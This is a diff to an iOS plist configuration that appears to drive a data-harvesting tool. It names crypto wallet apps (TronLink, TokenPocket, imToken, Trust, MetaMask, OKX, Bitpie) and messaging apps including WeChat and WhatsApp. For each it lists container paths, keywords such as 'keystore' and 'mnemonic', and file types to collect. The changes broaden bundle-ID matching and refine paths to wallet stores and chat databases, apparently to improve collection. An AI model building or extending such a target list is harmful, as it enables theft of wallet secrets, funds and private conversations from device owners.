@@ -9,6 +9,12 @@
 		<dict>
 			<key>name</key><string>TronLink</string>
 			<key>bundleId</key><string>io.tronlink.wallet</string>
+			<key>bundleIds</key>
+			<array>
+				<string>io.tronlink.wallet</string>
+				<string>com.tronlink.wallet</string>
+				<string>org.tronlink.wallet</string>
+			</array>
 			<key>mode</key><string>files</string>
 			<key>paths</key>
 			<array>
@@ -24,6 +30,12 @@
 		<dict>
 			<key>name</key><string>TokenPocket</string>
 			<key>bundleId</key><string>com.global.wallet.ios</string>
+			<key>bundleIds</key>
+			<array>
+				<string>com.global.wallet.ios</string>
+				<string>com.tokenpocket.ios</string>
+				<string>io.tokenpocket.ios</string>
+			</array>
 			<key>mode</key><string>files</string>
 			<key>paths</key>
 			<array>
@@ -39,13 +51,25 @@
 			<key>name</key><string>imToken</string>
 			<key>bundleId</key><string>im.token.app</string>
 			<key>mode</key><string>files</string>
-			<key>paths</key><array><string>Documents</string></array>
-			<key>keywords</key><array><string>wallet</string><string>keystore</string><string>realm</string></array>
-			<key>exts</key><array><string>realm</string><string>sqlite</string><string>json</string></array>
+			<key>paths</key>
+			<array>
+				<string>Documents/walletsV2</string>
+				<string>Documents/default.realm</string>
+				<string>Documents/default.realm.lock</string>
+				<string>Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1</string>
+			</array>
+			<key>keywords</key><array><string>walletsV2</string><string>default.realm</string><string>RCTAsyncLocalStorage</string></array>
+			<key>exts</key><array><string>realm</string><string>json</string><string>lock</string><string>sqlite</string><string>plist</string></array>
 		</dict>
 		<dict>
 			<key>name</key><string>Trust</string>
 			<key>bundleId</key><string>com.trustwallet.app</string>
+			<key>bundleIds</key>
+			<array>
+				<string>com.trustwallet.app</string>
+				<string>com.trustwallet.app.web</string>
+				<string>com.trustwallet.ios</string>
+			</array>
 			<key>mode</key><string>files</string>
 			<key>paths</key>
 			<array>
@@ -58,6 +82,11 @@
 		<dict>
 			<key>name</key><string>MetaMask</string>
 			<key>bundleId</key><string>io.metamask.MetaMask</string>
+			<key>bundleIds</key>
+			<array>
+				<string>io.metamask.MetaMask</string>
+				<string>io.metamask.MetaMask.Redux</string>
+			</array>
 			<key>mode</key><string>files</string>
 			<key>paths</key>
 			<array>
@@ -70,6 +99,13 @@
 		<dict>
 			<key>name</key><string>OKX</string>
 			<key>bundleId</key><string>com.okinc.okx</string>
+			<key>bundleIds</key>
+			<array>
+				<string>com.okinc.okx</string>
+				<string>com.okex.OKExAppstoreFull</string>
+				<string>com.okex.OKEx</string>
+				<string>com.okex.OKExApp</string>
+			</array>
 			<key>mode</key><string>files</string>
 			<key>paths</key><array><string>Documents/wallet</string></array>
 			<key>keywords</key><array><string>wallet</string><string>keystore</string><string>mnemonic</string></array>
@@ -78,6 +114,11 @@
 		<dict>
 			<key>name</key><string>Bitpie</string>
 			<key>bundleId</key><string>com.bitpie.ios</string>
+			<key>bundleIds</key>
+			<array>
+				<string>com.bitpie.ios</string>
+				<string>com.bitpie.wallet</string>
+			</array>
 			<key>mode</key><string>whole_container</string>
 		</dict>
 		<dict>
@@ -99,11 +140,35 @@
 			<key>mode</key><string>files</string>
 			<key>paths</key>
 			<array>
-				<string>Documents/ChatStorage.sqlite</string>
-				<string>Documents/ContactsV2.sqlite</string>
+				<string>Library/Application Support</string>
+				<string>Documents</string>
 			</array>
-			<key>keywords</key><array><string>ChatStorage</string><string>ContactsV2</string></array>
-			<key>exts</key><array><string>sqlite</string></array>
+			<key>keywords</key><array><string>postbox</string><string>message</string><string>db</string></array>
+			<key>exts</key><array><string>db</string><string>sqlite</string><string>plist</string></array>
+			<key>excludes</key><array><string>Caches</string><string>HTTPStorages</string><string>WebKit</string><string>media</string><string>files</string><string>sentry</string><string>crashlytics</string></array>
+		</dict>
+		<dict>
+			<key>name</key><string>WeChat</string>
+			<key>bundleId</key><string>com.tencent.xin</string>
+			<key>bundleIds</key>
+			<array>
+				<string>com.tencent.xin</string>
+			</array>
+			<key>mode</key><string>files</string>
+			<key>paths</key>
+			<array>
+				<string>Documents</string>
+			</array>
+			<key>keywords</key><array><string>MM.sqlite</string><string>message</string><string>WCDB_Contact</string></array>
+			<key>exts</key><array><string>sqlite</string><string>db</string></array>
+			<key>excludes</key>
+			<array>
+				<string>Brand</string><string>brandTimelineAff</string><string>BakChatFile</string>
+				<string>OpenData</string><string>Ting</string><string>Ecs</string>
+				<string>OrderCenter</string><string>MMappedKV</string><string>chat_</string>
+				<string>Caches</string><string>HTTPStorages</string><string>WebKit</string>
+				<string>sentry</string><string>crashlytics</string>
+			</array>
 		</dict>
 		<dict>
 			<key>name</key><string>WhatsApp</string>
@@ -116,14 +181,6 @@
 			</array>
 			<key>keywords</key><array><string>ChatStorage</string><string>ContactsV2</string></array>
 			<key>exts</key><array><string>sqlite</string></array>
-		</dict>
-		<dict>
-			<key>name</key><string>WeChat</string>
-			<key>bundleId</key><string>com.tencent.xin</string>
-			<key>mode</key><string>files</string>
-			<key>paths</key><array><string>Documents/MM.sqlite</string></array>
-			<key>keywords</key><array><string>MM.sqlite</string><string>mm.sqlite</string><string>contact</string></array>
-			<key>exts</key><array><string>sqlite</string><string>db</string></array>
 		</dict>
 	</array>
 </dict>
